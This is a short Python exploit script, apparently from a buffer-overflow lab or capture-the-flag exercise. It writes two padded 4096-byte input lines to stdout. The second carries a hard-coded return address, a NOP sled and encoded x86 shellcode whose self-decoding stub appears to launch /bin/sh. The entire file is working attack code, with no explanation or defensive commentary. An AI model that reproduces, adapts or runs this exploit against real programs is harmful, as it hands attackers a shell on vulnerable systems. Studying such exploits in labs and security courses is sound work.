import sys

def pad_to_4096(str):
        return str + '\x01' * (4096 - 1 - len(str)) + '\n'

nop_sled = '\x90' * 256

shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80" \
            "\x6c\x0e\xff\x01\x80\xe9\x01\x75" \
            "\xf6\xeb\x05\xe8\xea\xff\xff\xff" \
            "\x32\xc1\x51\x69\x30\x30\x74\x69" \
            "\x69\x30\x63\x6a\x6f\x8a\xe4\x51" \
            "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

#0xbfffe6f0
shellcode_address = '\xf0\xe6\xff\xbf'

sys.stdout.write(pad_to_4096('X' * 20))
sys.stdout.write(pad_to_4096('011111111%s33444455556666777788889999%s%s' % (shellcode_address, nop_sled, shellcode)))